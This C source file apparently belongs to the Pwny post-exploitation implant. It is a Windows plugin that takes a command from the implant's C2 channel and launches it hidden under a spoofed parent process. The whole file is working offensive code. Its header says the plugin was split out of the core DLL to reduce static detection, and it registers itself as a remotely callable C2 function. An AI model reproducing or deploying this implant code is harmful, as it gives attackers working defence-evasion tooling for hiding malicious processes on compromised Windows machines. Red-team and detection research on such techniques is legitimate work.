/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * PPID spoof tab plugin — spawn a process with a spoofed parent PID.
 *
 * Moved out of the core DLL to reduce the static detection
 * surface. Loaded on demand as a tab DLL via pe_load().
 */

#ifdef __windows__

#include <pwny/tab_dll.h>

#include <windows.h>
#include <pwny/c2.h>
#include <pwny/log.h>

#define PPID_BASE 26

#define PPID_SPAWN \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       PPID_BASE, \
                       API_CALL)

#define TLV_TYPE_PPID_PARENT TLV_TYPE_CUSTOM(TLV_TYPE_INT, PPID_BASE, API_TYPE)
#define TLV_TYPE_PPID_CMD    TLV_TYPE_CUSTOM(TLV_TYPE_STRING, PPID_BASE, API_TYPE)
#define TLV_TYPE_PPID_CHILD  TLV_TYPE_CUSTOM(TLV_TYPE_INT, PPID_BASE, API_TYPE + 1)

static tlv_pkt_t *ppid_spawn(c2_t *c2)
{
    int parent_pid;
    char cmd[1024];
    HANDLE hParent;

    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T attrSize;

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_PPID_PARENT, &parent_pid) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_PPID_CMD, cmd) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, (DWORD)parent_pid);
    if (hParent == NULL)
    {
        log_debug("* ppid_spawn: OpenProcess(%d) failed (%lu)\n",
                  parent_pid, GetLastError());
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    memset(&si, 0, sizeof(si));
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    memset(&pi, 0, sizeof(pi));

    /* Determine attribute list size */
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);

    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(attrSize);
    if (si.lpAttributeList == NULL)
    {
        CloseHandle(hParent);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize))
    {
        log_debug("* ppid_spawn: InitializeProcThreadAttributeList failed (%lu)\n",
                  GetLastError());
        free(si.lpAttributeList);
        CloseHandle(hParent);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (!UpdateProcThreadAttribute(si.lpAttributeList, 0,
                                   PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                   &hParent, sizeof(HANDLE), NULL, NULL))
    {
        log_debug("* ppid_spawn: UpdateProcThreadAttribute failed (%lu)\n",
                  GetLastError());
        DeleteProcThreadAttributeList(si.lpAttributeList);
        free(si.lpAttributeList);
        CloseHandle(hParent);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                        EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
                        NULL, NULL,
                        (LPSTARTUPINFOA)&si, &pi))
    {
        log_debug("* ppid_spawn: CreateProcess failed (%lu)\n", GetLastError());
        DeleteProcThreadAttributeList(si.lpAttributeList);
        free(si.lpAttributeList);
        CloseHandle(hParent);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    DeleteProcThreadAttributeList(si.lpAttributeList);
    free(si.lpAttributeList);
    CloseHandle(hParent);

    CloseHandle(pi.hThread);

    {
        tlv_pkt_t *result;
        result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
        tlv_pkt_add_u32(result, TLV_TYPE_PPID_CHILD, (int32_t)pi.dwProcessId);
        CloseHandle(pi.hProcess);
        return result;
    }
}

TAB_DLL_EXPORT void TabInit(api_calls_t **api_calls)
{
    api_call_register(api_calls, PPID_SPAWN, (api_t)ppid_spawn);
}

#endif
